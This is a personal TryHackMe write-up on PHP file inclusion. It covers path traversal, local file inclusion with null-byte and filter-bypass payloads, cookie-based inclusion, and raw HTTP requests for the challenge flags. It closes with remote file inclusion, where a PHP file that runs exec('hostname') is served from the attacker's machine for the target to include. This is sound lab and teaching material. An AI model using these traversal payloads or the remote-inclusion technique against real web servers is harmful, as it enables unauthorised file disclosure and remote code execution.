# File Inclusion

# Task 1: Introduction

# Task 2: Deploy the VM

# Task 3: Path Traversal

1. unsanitized input to file_get_contents causes path traversal vulnerabilities in php

# Task 4: Local File Inclusion

```
<?PHP 
	include($_GET["lang"]);
?>
```
The user could try either of the following to requests pages in a particular language

http://webapp.thm/index.php?lang=EN.php
http://webapp.thm/index.php?lang=AR.php

or could be malicious

http://webapp.thm/get.php?file=/etc/passwd

- include does not specify a directory and there is no input validation

1. Give Lab #1 a try to read /etc/passwd. What would the request URI be?

ANSWER: /lab1.php?file=/etc/passwd

2. In Lab #2, what is the directory specified in the include function?

ANSWER: includes

# Task 5: Local File Inclusion - LFI #2

- Error messages can disclose interesting information about the path
- can use null bytes to terminate string (this can be used to defeat websites which add file extensions)
	- include("languages/../../../../../etc/passwd%00").".php");
	- NOTE: this is fixed in PHP 5.3.4

1. Give Lab #3 a try to read /etc/passwd. What is the request look like?

ANSWER: lab3.php?file=../../../../etc/passwd%00

- Some tricks for bypassing explicit filename filters
- use null-byte at the end %00
- use /. at the end

```
sidequest

not sure why the /. still works as we are providing a directory instead of an individual file

<?php
    echo file_get_contents("/etc/passwd", "r");
?>

works but

<?php
    echo file_get_contents("/etc/passwd/.", "r");
?>

└─$ php test.php
PHP Warning:  file_get_contents(/etc/passwd/.): Failed to open stream: No such file or directory in /home/kali/thm/file_inclusion/working/test.php on line 2

```

2. Which function is causing the directory traversal in Lab #4?

ANSWER: file_get_contents

```
used "lab4.php?file=../../../../etc/passwd/."
```

- Input Validation
- Can replace '../' with ''
- bypass using '....//....//....//....//....//etc/passwd'
	- this works only if they are doing a single iteration

```
Lab #5

/lab5.php?file=....//....//....//....//etc/passwd

```

- Sometimes a defined directory must be included in the input
- Just include it and go go up an extra directory

3. Try out Lab #6 and check what is the directory that has to be in the input field?

ANSWER: THM-profile

4. Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value?

ANSWER: 12.04

```
/lab6.php?file=THM-profile/../../../../../etc/os-release
```

# Task 6: Remote File Inclusion - RFI

- Technique to include remote files into an application
- Inject external URL into include function call
- for php 'allow_url_fopen' needs to be set to on
- This attack allows for RCE as we can send content instead of just reading files on disk
	- Sensitive Information Disclosure
	- Cross-site Scripting (XSS)
	- Denial of Service (DoS)


## RFI Steps

http://attacker.thm.cmd.txt
```
<?PHP echo "Hello THM"; ?>
```

- Attacker can send "http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt"
- The url is then passed into the include function
- The web app sends GET request for this page
- Receives response and executes, returning the result to the attacker

# Task 7: Remediation

1. update things
2. Turn off PHP errors to avoid leaking information
3. Web Application Firewall (WAF)
4. Disable PHP features that cause vulnerabilities if you don't need them
5. Allow only protocols and PHP wrappers that are needed
6. Never trust user input and validate
7. allow and deny lists for file names and locations

# Task 8: Challenge

1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!
2. Enter a valid input to see how the web server behaves.
3. Enter invalid inputs, including special characters and common file names.
4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
6. Understand the input validation and if there are any filters!
7. Try the inject a valid entry to read sensitive files

1. Capture Flag1 at /etc/flag1

The input form does not work and you must craft your own POST request
- First try to get a successful request to work
- Use burpsuite to intercept the usual request
- Convert manually to a POST request

```
GET /challenges/chall1.php?file=welcome.php HTTP/1.1
Host: 10.10.160.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.160.167/challenges/chall1.php?file=welcome
Upgrade-Insecure-Requests: 1
```

- Couldn't seem to get welcome.php to work so just yolo'd
- Figured out the number of directories needed to traverse from the error response "/var/www/html" and the url was challenges/chall1.php

```
POST /challenges/chall1.php HTTP/1.1
Host: 10.10.82.100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

file=../../../../etc/flag1
```

2. Capture Flag2 at /etc/flag2

- When accessing the page it prompts you to refresh the page
- Intercepting this request with burpsuite a cookie is observed in the request
```
GET /challenges/chall2.php HTTP/1.1
Host: 10.10.54.175
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.54.175/challenges/
Connection: close
Cookie: THM=Guest
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
- Attempt to change the THM cookie to Admin and we get an error response
```
File Content Preview of Admin
Welcome Admin

Warning: include(includes/Admin.php) [function.include]: failed to open stream: No such file or directory in /var/www/html/chall2.php on line 37

Warning: include() [function.include]: Failed opening 'includes/Admin.php' for inclusion (include_path='.:/usr/lib/php5.2/lib/php') in /var/www/html/chall2.php on line 37
```
- Can attempt a path traversal by changing the cookie to ../../../../etc/flag2
```
<b>Warning</b>:  include() [<a href='function.include'>function.include</a>]: Failed opening 'includes/../../../../etc/flag2.php' for inclusion (include_path='.:/usr/lib/php5.2/lib/php') in <b>/var/www/html/chall2.php</b> on line <b>37</b>
```
- This fails because '.php' is being appended to the output
- as this is php 5.2 can try the null byte terminator and the flag is output
```
GET /challenges/chall2.php HTTP/1.1
Host: 10.10.54.175
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.54.175/challenges/
Connection: close
Cookie: THM=../../../../etc/flag2%00
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

3. Capture Flag3 at /etc/flag3

Attempt the standard request
```
GET /challenges//chall3.php?file=welcome HTTP/1.1
Host: 10.10.54.175
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.54.175/challenges/chall3.php
Cookie: THM=Guest
Upgrade-Insecure-Requests: 1
```
- The THM cookie is back again
- setting the file parameter to /etc/passwd, results in the backslashes removed from the file name in the error message (it also adds the .php file extension but we know how to deal with that in this php version)
```
<b>Warning</b>:  include(etcpasswd.php) [<a href='function.include'>function.include</a>]: failed to open stream: No such file or directory in <b>/var/www/html/chall3.php</b> on line <b>30</b>
```
- try file=//etc//passwd and we get the same result
- I got a bit stuck here and resorted to the hint and start going down a rabbit hole to learn about a php super global variable called REQUESTS
```
sidequest

superglobal variables were introduced in php 4.1.0, and they are variables that are available in any scope, here is the list provided on the w3schools website

$GLOBALS
$_SERVER
$_REQUEST
$_POST
$_GET
$_FILES
$_ENV
$_COOKIE
$_SESSION

Let's play around with the $_REQUEST superglobal, not sure if this is ideal but I installed the php-cgi tool to do this
cgi stands for common gateway interface, it is an outdated but still commonly used way of getting web applications to run external programs. These external programs will usually respond with some html file that can be sent back to a client
The standard php binary does not have the $_REQUEST superglobal set up, (though it did seem to have $_SERVER)

this sample from w3schools seems to show a standard use case for the $_REQUEST variable

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // collect value of input field
  $name = $_REQUEST['fname'];
  if (empty($name)) {
    echo "Name is empty";
  } else {
    echo $name;
  }
}
?>

If I comment out the server request method line this outputs some results
┌──(kali㉿kali)-[~/thm/file_inclusion/working]
└─$ php-cgi -f test.php fname=yeet b=3
yeet

Maybe next time I'll do this with an actual web server but this gives us enough information to proceed

```

- Based on the hint it seems clear that the GET request is being filtered so try POST
```
POST /challenges/chall3.php HTTP/1.1
Host: 10.10.160.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/x-www-form-urlencoded
Cookie: THM=Guest
Content-Length: 16

file=/etc/passwd
```
- This gives us
```
<code><br />
<b>Warning</b>:  include(/etc/passwd.php) [<a href='function.include'>function.include</a>]: failed to open stream: No such file or directory in <b>/var/www/html/chall3.php</b> on line <b>49</b><br />
<br />
<b>Warning</b>:  include() [<a href='function.include'>function.include</a>]: Failed opening '/etc/passwd.php' for inclusion (include_path='.:/usr/lib/php5.2/lib/php') in <b>/var/www/html/chall3.php</b> on line <b>49</b><br />
</code>
```
- We can see that the forward slashes are still in the request
- At this point I realized I should be using /etc/flag3 instead, so the successful request is given by
```
POST /challenges/chall3.php HTTP/1.1
Host: 10.10.160.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/x-www-form-urlencoded
Cookie: THM=Guest
Content-Length: 18

file=/etc/flag3%00
```

4. Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?

- the question tells us we need to use RFI
- we need to server some php file and then tell the victim to request it
- I used the following
```
<?php
    echo exec('hostname');
?>

```
- then use python to serve the file
```
python3 -m http.server
```
- It defaults to port 8000 so used this to tell the victim to run my file
```
http://<tun0 ip>:8000/test.php
```